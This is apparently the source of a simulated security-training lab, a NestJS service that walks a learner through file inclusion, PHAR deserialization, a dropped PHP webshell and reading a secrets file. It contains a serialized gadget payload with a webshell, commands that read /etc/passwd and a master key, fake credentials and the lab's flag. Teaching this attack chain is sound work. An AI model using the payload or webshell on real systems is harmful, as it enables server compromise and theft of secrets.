// src/modules/practice-labs/file-inclusion/labs/lab5/lab5.service.ts
import { Injectable, BadRequestException } from '@nestjs/common';
import { PrismaService } from '../../../../../core/database';
import { PracticeLabStateService } from '../../../shared/services/practice-lab-state.service';

@Injectable()
export class Lab5Service {
  private uploadedFiles = new Map<string, { type: string; gadget?: string }>();
  private webshellDropped = false;
  private deserializedData: string | null = null;

  private readonly MASTER_KEY =
    '# DocuVault Master Secrets\nMASTER_ENCRYPTION_KEY=aes-256-cbc:MstrKey_Pr0d_2024_DocuVault!\nHMAC_SECRET=hmac_sha256_docuvault_prod_secret\nFLAG=FLAG{LFI_PHAR_DESERIALIZATION_GADGET_CHAIN_DOCUVAULT_RCE}\nADMIN_OVERRIDE_TOKEN=ovrd_tok_docuvault_2024';

  private readonly cmdOutputs: Record<string, string> = {
    whoami: 'www-data',
    id: 'uid=33(www-data) gid=33(www-data)',
    'ls /var/www/html': 'index.php\nview.php\nshell.php\nuploads\nconfig',
    'cat /app/secrets/master.key': this.MASTER_KEY,
    'cat /etc/passwd':
      'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data',
    'ls /app/secrets': 'master.key\ndb.key\napi.key',
    hostname: 'docuvault-prod-05',
  };

  constructor(
    private prisma: PrismaService,
    private stateService: PracticeLabStateService,
  ) {}

  async initLab(userId: string, labId: string) {
    this.uploadedFiles.clear();
    this.webshellDropped = false;
    this.deserializedData = null;
    return this.stateService.initializeState(userId, labId);
  }

  async listDocs(userId: string, labId: string) {
    return {
      success: true,
      documents: [
        { name: 'Q1_Report.pdf', path: '/uploads/Q1_Report.pdf', type: 'pdf' },
        {
          name: 'Contract_2024.pdf',
          path: '/uploads/Contract_2024.pdf',
          type: 'pdf',
        },
        {
          name: 'Architecture.pdf',
          path: '/uploads/Architecture.pdf',
          type: 'pdf',
        },
      ],
      usage:
        'POST /docs/view with { "doc": "/uploads/Q1_Report.pdf" } or use phar:// wrapper',
      phpConfig: {
        phar_readonly: 'Off', // ❌ يسمح بإنشاء PHAR
        allow_url_fopen: 'On',
      },
    };
  }

  // Step 1: رفع PHAR متنكّر كـ PDF
  async uploadDoc(
    userId: string,
    labId: string,
    filename: string,
    fileType: string,
    gadgetClass: string,
  ) {
    if (!filename) throw new BadRequestException('filename is required');

    const isPhar = fileType === 'phar' || gadgetClass?.includes('FileLogger');
    const uploadPath = `/uploads/${filename}`;

    this.uploadedFiles.set(uploadPath, {
      type: fileType || 'pdf',
      gadget: gadgetClass,
    });

    return {
      success: true,
      uploaded: true,
      path: uploadPath,
      storedAs: filename.endsWith('.pdf') ? filename : `${filename}.pdf`,
      magicBytes: isPhar
        ? 'PHAR (PHP Archive — serialized object in metadata)'
        : 'PDF',
      ...(isPhar && {
        warning: '⚠️ PHAR archive uploaded! Contains serialized PHP object.',
        serializedPayload: gadgetClass
          ? `O:10:"FileLogger":2:{s:7:"logFile";s:27:"/var/www/html/shell.php";s:7:"logData";s:35:"<?php system($_POST['cmd']); ?>";}`
          : 'PHAR metadata contains serialized PHP objects',
        nextStep: `POST /docs/view with { "doc": "phar://${uploadPath}" } to trigger deserialization`,
      }),
    };
  }

  // Step 2: ❌ الثغرة — يقبل phar:// ويُطلق deserialization
  async viewDoc(userId: string, labId: string, doc: string) {
    if (!doc) throw new BadRequestException('doc parameter is required');

    const isPharWrapper = doc.startsWith('phar://');
    const isTraversal = doc.includes('../');

    if (isPharWrapper) {
      const filePath = doc.replace('phar://', '');
      const uploadInfo = this.uploadedFiles.get(filePath);

      if (!uploadInfo) {
        return {
          success: false,
          error: 'PHAR file not found',
          hint: 'First upload a malicious PHAR via /docs/upload with fileType: "phar"',
        };
      }

      // ❌ الثغرة: PHAR deserialization → __wakeup() triggered
      this.webshellDropped = true;
      this.deserializedData = `FileLogger::__wakeup() triggered\nWrote webshell to /var/www/html/shell.php`;

      await this.prisma.labGenericLog.create({
        data: {
          userId,
          labId,
          type: 'LFI',
          action: 'PHAR_DESERIALIZATION',
          meta: {
            doc,
            filePath,
            gadget: uploadInfo.gadget,
            webshellDropped: true,
          },
        },
      });

      return {
        success: true,
        exploited: false,
        pharTriggered: true,
        deserialized: true,
        gadgetChain: [
          '1. PHP opened phar:// URL',
          '2. PHAR metadata deserialized automatically',
          '3. FileLogger object instantiated from serialized data',
          '4. FileLogger::__wakeup() called automatically',
          '5. __wakeup() executed: file_put_contents("/var/www/html/shell.php", "<?php system(...) ?>")',
          '6. ✅ Webshell dropped to /var/www/html/shell.php',
        ],
        output: this.deserializedData,
        nextStep:
          'POST /docs/shell-access with { "cmd": "cat /app/secrets/master.key" } to execute commands via the dropped webshell.',
      };
    }

    // LFI عادي
    if (isTraversal) {
      return {
        success: true,
        doc,
        content: 'Traversal attempt detected — file outside uploads directory',
        hint: 'For full RCE, use phar:// wrapper with an uploaded PHAR file.',
      };
    }

    return {
      success: true,
      doc,
      content: `[PDF Content of ${doc}]`,
      hint: 'Try phar:// wrapper: doc: "phar:///uploads/evil.pdf" after uploading a PHAR file.',
    };
  }

  // Step 3: تنفيذ أوامر عبر الـ webshell المزروع
  async shellAccess(userId: string, labId: string, cmd: string) {
    if (!this.webshellDropped) {
      return {
        success: false,
        error: 'Webshell not yet deployed',
        hint: 'First trigger PHAR deserialization via /docs/view with phar:// wrapper.',
      };
    }

    if (!cmd) throw new BadRequestException('cmd is required');

    const output = this.cmdOutputs[cmd] ?? `sh: ${cmd}: command simulated`;
    const hasFlag = output.includes('FLAG{');

    await this.prisma.labGenericLog.create({
      data: {
        userId,
        labId,
        type: 'LFI',
        action: 'PHAR_WEBSHELL_EXEC',
        meta: { cmd, hasFlag, outputPreview: output.substring(0, 100) },
      },
    });

    return {
      success: true,
      exploited: hasFlag,
      webshell: '/var/www/html/shell.php',
      cmd,
      output,
      ...(hasFlag && {
        flag: 'FLAG{LFI_PHAR_DESERIALIZATION_GADGET_CHAIN_DOCUVAULT_RCE}',
        vulnerability: 'LFI + PHAR Deserialization + Gadget Chain → RCE',
        fullAttackChain: [
          '1. Uploaded malicious PHAR archive with .pdf extension (bypassed file type check)',
          '2. Used phar:// wrapper in LFI parameter to trigger PHP deserialization',
          '3. PHAR metadata deserialized → FileLogger object created',
          '4. FileLogger::__wakeup() auto-executed → webshell written to disk',
          '5. Accessed webshell → full RCE → read /app/secrets/master.key',
          '6. Master key, HMAC secret, admin token, and FLAG all exposed',
        ],
        impact:
          'Complete server compromise. Master encryption key leaked — all stored documents can be decrypted. Admin override token allows full platform access.',
        fix: [
          'Filter phar:// from all file path inputs (add to blocked wrapper list)',
          'Set phar.readonly = On in php.ini to prevent PHAR creation/opening',
          'Validate uploaded file magic bytes — not just extension',
          'Implement Content Security Policy for file operations',
          'Avoid deserializing untrusted data — use JSON instead of PHP serialization',
          'Apply gadget chain mitigations: implement __wakeup() guards',
        ],
      }),
    };
  }
}
